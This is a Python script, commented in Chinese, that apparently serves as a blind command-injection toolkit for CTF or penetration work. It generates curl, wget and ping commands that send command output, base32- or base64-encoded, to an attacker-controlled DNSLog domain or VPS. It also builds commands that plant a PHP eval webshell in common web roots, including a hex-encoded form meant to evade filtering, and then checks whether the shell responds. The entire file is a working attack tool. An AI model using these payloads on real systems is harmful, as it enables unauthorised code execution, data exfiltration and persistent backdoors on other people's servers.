#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
用途: 无回显 RCE 外带模板 —— 生成 DNSLog/HTTP 外带命令变体(curl/wget/base32 兼容 DNS),
     并提供 webshell 落点写入 + 探活检测; 打盲注 RCE 时一条条试
适用条件:
    - 已有命令注入/RCE 点但无回显(盲执行)
    - DNS 外带: 目标能出网解析; HTTP 外带: 能出网访问 VPS/dnslog 平台
用法:
    python web_oob_rce.py gen --cmd "cat /flag" --dnslog xxx.ceye.io       # 生成命令变体
    python web_oob_rce.py gen --cmd "cat /flag" --vps http://1.2.3.4:8000  # HTTP 外带变体
    python web_oob_rce.py shell -u http://t/rce.php -p c --webroot /var/www/html  # 落地马+探活
    收到外带后解码: echo '<base32大写去等号>' | tr 'a-z' 'A-Z' | base32 -d
"""
import argparse
import requests

# 常见 webshell 落点(按目标实际 web 根改)
WEBSHELL_PATHS = [
    "/var/www/html/",
    "/usr/share/nginx/html/",
    "/var/www/",
    "/app/",
    "/opt/lampp/htdocs/",
]

MARKER = "P0LL1n9"          # 探活标记, 写进 shell 内容里用于比对


def dns_variants(cmd: str, dnslog: str) -> list:
    """DNS 外带变体: 结果走子域名, base32 兼容 DNS 字符集(大写+数字, 去等号)"""
    return [
        # 直接把命令结果塞进域名
        f"curl http://`{cmd} | base32 -w0 | tr -d '=' | tr 'A-Z' 'a-z'`.out.{dnslog}/",
        # curl 不可用时换 ping(只外带固定标识, 证明出网)
        f"ping -c1 $(whoami | base32 -w0 | tr -d '=').out.{dnslog}",
        # 反引号被过滤时的 $() 版本
        f"ping -c1 $(id -u).$(hostname).out.{dnslog}",
    ]


def http_variants(cmd: str, vps: str) -> list:
    """HTTP 外带变体: 结果 base64 放路径/POST 体; +/= 会坏 URL, 用 tr 换安全字符"""
    return [
        f"curl {vps}/`{cmd} | base64 -w0 | tr '/+' '_-'`",
        f"wget -q -O- --post-data=\"r=`{cmd} | base64 -w0`\" {vps}/oob",
        f"curl -X POST -d \"r=$({cmd} | base64 -w0)\" {vps}/oob",
        # 出网受限时: 利用 DNSLog 判真 + 时间盲注逐位拖(参考 web_sqlmap_kit 思路)
        f"if [ $({cmd} | cut -c1) = 'f' ]; then sleep 3; fi",
    ]


def build_webshell_cmds(shell_url_path: str = "t.php") -> list:
    """生成向各落点写一句话马的命令, 优先 echo 简单马, 过滤时用 hex 落地"""
    shell = f'<?php if(isset($_REQUEST[1]))echo "{MARKER}";eval($_REQUEST[1]);?>'
    hexstr = shell.encode().hex()  # hex 落地防引号转义问题
    cmds = []
    for root in WEBSHELL_PATHS:
        cmds.append(f"echo '<?php eval($_REQUEST[1]);?>' > {root}{shell_url_path}")
        cmds.append(f"echo {hexstr} | xxd -r -p > {root}{shell_url_path}")
    return cmds


def check_webshell(base_url: str, shell_path: str = "t.php", proxy: str = None) -> None:
    """探活: 请求常见相对路径下的 shell, POST 1=echo 标记 观察是否解析"""
    sess = requests.Session()
    if proxy:
        sess.proxies = {"http": proxy, "https": proxy}
    # 常见相对路径(映射自 WEBSHELL_PATHS) + 站点根
    rel_dirs = ["", "/var/www/html", "/usr/share/nginx/html", "/var/www", "/app"]
    for d in rel_dirs:
        url = f"{base_url.rstrip('/')}{d}/{shell_path}"
        try:
            r = sess.post(url, data={"1": f'echo "{MARKER}";'}, timeout=8)
            if MARKER in r.text:
                print(f"[+] webshell 存活: {url}  密码参数: 1")
            elif r.status_code == 200:
                print(f"[?] 200 但未解析: {url} (可能没落对位置/不解析)")
        except requests.RequestException:
            pass


def main():
    ap = argparse.ArgumentParser(description="无回显 RCE 外带模板")
    sub = ap.add_subparsers(dest="mode", required=True)

    g = sub.add_parser("gen", help="生成外带命令变体")
    g.add_argument("--cmd", required=True, help="要外带结果的命令, 如 cat /flag")
    g.add_argument("--dnslog", help="DNSLog 域名, 如 xxx.ceye.io")
    g.add_argument("--vps", help="VPS HTTP 服务, 如 http://1.2.3.4:8000")

    s = sub.add_parser("shell", help="写 shell 命令变体 + 探活")
    s.add_argument("-u", "--url", required=True, help="站点根 URL")
    s.add_argument("-p", "--param", help="注入点参数名(gen 命令发到该参数, 可选)")
    s.add_argument("--webroot", help="已知 web 根, 指定后只生成该路径")
    s.add_argument("--proxy", help="代理")

    args = ap.parse_args()
    if args.mode == "gen":
        if args.dnslog:
            print("[*] DNS 外带变体:")
            for c in dns_variants(args.cmd, args.dnslog):
                print("  " + c)
        if args.vps:
            print("[*] HTTP 外带变体:")
            for c in http_variants(args.cmd, args.vps):
                print("  " + c)
        if not args.dnslog and not args.vps:
            ap.error("gen 需要 --dnslog 或 --vps 至少一个")
    else:
        cmds = build_webshell_cmds()
        if args.webroot:
            cmds = [f"echo '<?php eval($_REQUEST[1]);?>' > {args.webroot.rstrip('/')}/t.php"]
        print("[*] 落马命令(逐条塞进 RCE 点):")
        for c in cmds:
            print("  " + c)
        print("[*] 开始探活...")
        check_webshell(args.url, proxy=args.proxy)


if __name__ == "__main__":
    main()
